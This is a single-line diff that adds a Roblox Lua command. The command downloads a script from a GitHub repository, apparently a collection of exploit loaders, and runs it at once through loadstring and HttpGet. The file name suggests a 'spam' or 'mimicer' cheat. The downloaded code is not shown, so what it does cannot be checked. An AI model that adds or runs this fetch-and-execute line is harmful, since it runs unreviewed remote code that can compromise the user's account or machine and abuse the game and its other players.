@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/morph-world-mimicer-spam0-lp9oelxbih874e.lua"))()
